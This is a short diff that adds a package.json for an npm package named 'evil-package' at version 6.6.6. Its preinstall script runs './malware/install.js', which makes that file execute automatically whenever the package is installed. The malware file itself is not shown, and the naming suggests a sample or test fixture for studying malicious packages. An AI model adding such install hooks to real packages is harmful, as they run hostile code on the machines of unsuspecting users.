@@ -1,0 +1,8 @@
+{
+    "name": "evil-package",
+    "version": "6.6.6",
+    "scripts": {
+        "start": "node index.js",
+        "preinstall": "node ./malware/install.js"
+    }
+}
